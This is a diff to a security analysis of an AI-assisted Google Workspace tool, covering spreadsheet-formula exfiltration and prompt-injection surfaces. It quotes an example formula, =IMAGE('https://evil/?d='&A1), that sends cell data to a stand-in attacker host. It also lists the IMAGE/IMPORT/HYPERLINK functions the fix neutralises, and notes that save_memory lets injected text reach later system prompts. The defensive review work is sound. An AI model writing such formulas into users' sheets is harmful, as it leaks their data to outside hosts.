@@ -121,11 +121,11 @@ A reviewer who had not seen this analysis tried to break the guarantee. The core
 
 Not changed, with reasons:
 
-* `update_sheet` / `create_spreadsheet` write with `USER_ENTERED`, so a formula such as `=IMAGE("https://evil/?d=...")` could leak cell data when the owner opens the sheet (reasoned by the reviewer, **not executed**). `append_google_doc` can write into a document shared with other people. Both are reversible own-data writes, left immediate by design; the safer variant for sheets (`RAW`) changes behaviour (formulas stop working) and needs a product decision.
+* `update_sheet` / `create_spreadsheet` write with `USER_ENTERED`, so a formula such as `=IMAGE("https://evil/?d="&A1)` could leak cell data when the owner opens the sheet (reasoned by the reviewer, **not executed**). **Narrowed on the `extras` branch** (`api/lib/sheetSafety.js`, `docs/sheets-formulas.md`): in what the model writes, a cell that calls `IMAGE`, `IMPORTXML`, `IMPORTDATA`, `IMPORTHTML`, `IMPORTFEED`, `IMPORTRANGE` or `HYPERLINK` is sent as text (leading apostrophe); every other formula keeps working, undo/redo still restores the user's own cells unchanged. Whether the real Sheets API stores that cell as text is **UNVERIFIED**. `append_google_doc` can write into a document shared with other people; it stays an immediate reversible own-data write.
 * `web_fetch` is a server-side GET; `cron/notes-reminders.js` mails the owner's own address with note text the model can write; `save_memory` lets injected text persist into later system prompts. Not outward-facing in the sense of this gate, but they are prompt-injection surfaces.
 * The digest is an unkeyed SHA-256: it detects accidental corruption of a stored row, not an attacker with database write access (who could also change the row).
 * `vercel.json` sets no `frame-ancestors`/CSP header (clickjacking of the Confirm button); pending cards stay in React state after sign-out (they expire in 10 minutes).
-* Not verified by anyone: live Gmail behaviour with injected headers, browser rendering of the exact attack text, Sheets `IMAGE` exfiltration, Anthropic's `web_fetch` URL limits.
+* Not verified by anyone: live Gmail behaviour with injected headers, browser rendering of the exact attack text, Sheets `IMAGE` exfiltration (before the `extras` change) and the apostrophe handling after it, Anthropic's `web_fetch` URL limits.
 
 ## Still open and not covered here
 
